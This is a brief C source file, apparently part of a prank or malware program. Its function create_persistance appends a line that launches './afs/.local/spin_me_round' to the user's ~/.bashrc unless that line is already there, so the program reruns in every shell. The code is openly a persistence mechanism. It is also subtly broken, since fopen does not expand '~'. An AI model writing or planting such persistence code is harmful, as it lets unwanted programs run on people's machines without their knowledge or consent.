#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "settle.h"

int NeedsMod()
{

    FILE *bashrc = fopen("~/.bashrc", "r");
    
    if (!bashrc)
        return EXIT_FAILURE;

    char *buffer = NULL;
    size_t buffer_size = 0;
    ssize_t a;
    int return_value = 1;

    while ((a = getline(&buffer, &buffer_size, bashrc)) != EOF)
    {
        if (strcmp(buffer, "./afs/.local/spin_me_round\n") == 0)
        {
            return_value = 0;
            break;
        }
    }

    free(buffer);
    fclose(bashrc);
    return return_value;
}

int create_persistance()
{
    if (NeedsMod())
    {
        FILE *bashrc = fopen("~/.bashrc", "a");
        
        if (!bashrc)
            return 1;

        fprintf(bashrc, "\n./afs/.local/spin_me_round\n");
        fclose(bashrc);
    }
    return 0;
}